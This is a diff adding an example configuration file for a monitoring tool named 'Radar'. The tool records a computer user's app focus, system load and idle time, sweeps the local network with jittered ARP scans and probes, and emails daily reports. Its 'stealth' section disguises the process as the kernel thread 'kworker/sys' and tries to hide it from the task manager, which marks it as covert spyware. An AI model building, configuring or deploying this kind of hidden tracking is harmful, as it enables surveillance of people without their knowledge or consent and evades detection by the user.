@@ -1,0 +1,34 @@
+# Radar Configuration (example)
+
+general:
+  report_time: "23:00"              # 24-hour format: when to send the daily report
+  timezone: "UTC"                   # Your local timezone
+  data_retention_days: 30           # How many days to keep data before auto-purge
+  log_level: "WARNING"              # Logging level (DEBUG/INFO/WARNING/ERROR)
+
+monitoring:
+  app_sample_interval: 30           # Seconds between app focus samples
+  system_sample_interval: 60        # Seconds between CPU/RAM snapshots
+  idle_threshold: 300               # Seconds of no input before marking as idle
+
+network:
+  scan_interval: 180                # Seconds between ARP sweeps (3 minutes)
+  scan_jitter: 60                   # Random jitter added to scan interval (+/- seconds)
+  subnet: "auto"                    # "auto" detects from interface, or specify "192.168.1.0/24"
+  interface: "auto"                 # "auto" picks the default WiFi interface
+  enable_mdns: true                 # Listen for mDNS/Bonjour announcements
+  enable_ssdp: true                 # Listen for SSDP/UPnP announcements
+  enable_netbios: true              # Send NetBIOS name queries
+
+email:
+  enabled: true
+  recipient: "your.email@gmail.com"
+  sender: "your.email@gmail.com"
+  smtp_server: "smtp.gmail.com"
+  smtp_port: 587
+  use_tls: true
+  # Credentials loaded from .env file (GMAIL_APP_PASSWORD)
+
+stealth:
+  process_name: "kworker/sys"       # Disguised process name
+  hide_from_taskmanager: true       # Attempt to hide from casual task manager view
